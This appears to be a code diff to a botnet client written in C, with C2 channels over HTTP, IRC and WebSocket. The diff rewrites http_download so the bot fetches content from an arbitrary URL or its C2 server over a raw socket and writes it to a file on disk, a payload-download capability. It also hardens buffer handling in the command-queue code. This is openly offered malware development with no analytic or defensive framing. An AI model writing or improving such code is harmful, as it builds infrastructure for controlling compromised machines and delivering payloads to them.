@@ -417,7 +417,7 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
     
     log_info("HTTP: heartbeat sent (%d bytes)", len);
     
-    char headers[512];
+    char headers[1024];
     snprintf(headers, sizeof(headers),
         "POST %s HTTP/1.1\r\n"
         "Host: %s\r\n"
@@ -448,7 +448,7 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
 int http_get(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_http.connected) return -1;
     
-    char req[512];
+    char req[1024];
     snprintf(req, sizeof(req),
         "GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
@@ -517,35 +517,169 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
     return received;
 }
 
+/* Open a fresh blocking TCP connection to host:port with a 3s timeout.
+ * Returns socket fd on success, -1 on failure. Caller must close. */
+static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port) {
+    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock < 0) return -1;
+
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+
+    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
+        in_addr_t resolved = (in_addr_t)protocol_resolve_host(host);
+        if (resolved == INADDR_NONE) {
+            close(sock);
+            return -1;
+        }
+        addr.sin_addr.s_addr = resolved;
+    }
+
+    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+    if (connect_err < 0 && errno != EINPROGRESS) {
+        close(sock);
+        return -1;
+    }
+
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 3;
+    tv.tv_usec = 0;
+
+    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    int so_error;
+    socklen_t len = sizeof(so_error);
+    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
+    if (so_error != 0) {
+        close(sock);
+        return -1;
+    }
+
+    fcntl(sock, F_SETFL, flags);
+    (void)bot;
+    return sock;
+}
+
 int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
+    /* Parse the target URL. Fall back to the configured C2 endpoint
+     * when url is NULL/empty so the old callers keep working. */
+    char host[256];
+    uint16_t port;
+    char path[512];
+
+    if (url && strncmp(url, "http://", 7) == 0) {
+        char authority[256];
+        const char *p = url + 7;
+        const char *slash = strchr(p, '/');
+        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
+        if (alen == 0 || alen >= sizeof(authority)) {
+            log_error("HTTP download: malformed URL %s", url);
+            return -1;
+        }
+        memcpy(authority, p, alen);
+        authority[alen] = '\0';
+
+        snprintf(host, sizeof(host), "%s", authority);
+        port = 80;
+        char *colon = strrchr(host, ':');
+        if (colon) {
+            *colon = '\0';
+            port = (uint16_t)atoi(colon + 1);
+            if (port == 0) port = 80;
+        }
+        if (slash) snprintf(path, sizeof(path), "%s", slash);
+        else snprintf(path, sizeof(path), "/");
+    } else {
+        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
+        port = bot->c2_http.port;
+        snprintf(path, sizeof(path), "%s", bot->c2_http.path);
+    }
+
     /* Use a stack buffer — single-threaded, callers don't recurse.
      * Avoids static buffer being overwritten by concurrent downloads. */
     char buf[PAYLOAD_MAX_SIZE];
-    int len = http_get(bot, buf, sizeof(buf));
-    if (len <= 0) return -1;
-    
-    /* SECURITY FIX (#6): Enforce PAYLOAD_MAX_SIZE on body length.
-     * A malicious server could send more than 64KB; the buffer
-     * is exactly PAYLOAD_MAX_SIZE so overflow is prevented at the
-     * http_get level, but we double-check the body here. */
+    char *body = NULL;
+    int body_len = 0;
+
+    int sock = tcp_connect_sock(bot, host, port);
+    if (sock < 0) {
+        log_error("http_download: connect to %s:%u failed", host, port);
+        return -1;
+    }
+
+    char req[1024];
+    int reqlen = snprintf(req, sizeof(req),
+        "GET %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: %s\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        path, host, bot->c2_http.user_agent);
+
+    if (send(sock, req, reqlen, 0) != reqlen) {
+        log_warn("http_download: GET send failed: %s", strerror(errno));
+        close(sock);
+        return -1;
+    }
+
+    /* Read response with 10s timeout to prevent indefinite blocking */
+    int total = 0;
+    while (total < (int)sizeof(buf) - 1) {
+        fd_set read_fds;
+        struct timeval tv;
+        FD_ZERO(&read_fds);
+        FD_SET(sock, &read_fds);
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+
+        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
+        if (sel <= 0) break;  /* timeout or error */
+
+        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
+        if (received <= 0) break;
+        total += received;
+    }
+    buf[total] = '\0';
+    close(sock);
+
+    if (total <= 0) {
+        log_error("http_download: empty response from %s:%u", host, port);
+        return -1;
+    }
+
     /* Simple HTTP response parsing - skip headers */
-    char *body = strstr(buf, "\r\n\r\n");
-    if (!body) return -1;
-    body += 4;
-    int body_len = len - (body - buf);
-    
+    char *hdr_end = strstr(buf, "\r\n\r\n");
+    if (!hdr_end) {
+        log_error("http_download: malformed HTTP response from %s:%u", host, port);
+        return -1;
+    }
+    body = hdr_end + 4;
+    body_len = total - (int)(body - buf);
+
+    /* SECURITY FIX (#6): Enforce PAYLOAD_MAX_SIZE on body length. */
     if (body_len > PAYLOAD_MAX_SIZE) {
         log_error("HTTP download: body exceeds PAYLOAD_MAX_SIZE (%d > %d)",
                   body_len, PAYLOAD_MAX_SIZE);
         return -1;
     }
     if (body_len <= 0) return -1;
-    
+
     FILE *f = fopen(dest, "wb");
     if (!f) return -1;
     fwrite(body, 1, body_len, f);
     fclose(f);
-    
+
     return body_len;
 }
 
@@ -856,7 +990,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
         if (result == 1) {
             /* New command in buffer - add to queue */
             if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
-                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%s", irc_buf);
+                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", irc_buf);
                 bot->cmd_count++;
             }
         }
@@ -900,13 +1034,13 @@ int protocol_process_commands(notnet_bot_t *bot) {
                                 char *args_end = strchr(args_val + 1, '\"');
                                 if (args_end && args_end > args_val) {
                                     int alen = args_end - args_val - 1;
-                                    if (alen > 0 && clen + 1 + alen < 254) {
+                                    if (alen > 0 && clen + 1 + alen < 255) {
                                         char combined[256];
                                         snprintf(combined, sizeof(combined), "%s %s",
                                                  bot->cmd_queue[bot->cmd_count],
                                                  args_val + 1);
-                                        strncpy(bot->cmd_queue[bot->cmd_count], combined, 255);
-                                        bot->cmd_queue[bot->cmd_count][255] = '\0';
+                                        snprintf(bot->cmd_queue[bot->cmd_count], 256,
+                                                 "%.255s", combined);
                                     }
                                 }
                             }
@@ -924,7 +1058,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
         int result = ws_read(bot, ws_buf, sizeof(ws_buf));
         if (result > 0) {
             if (bot->cmd_count < 256) {
-                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%s", ws_buf);
+                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", ws_buf);
                 bot->cmd_count++;
             }
         }
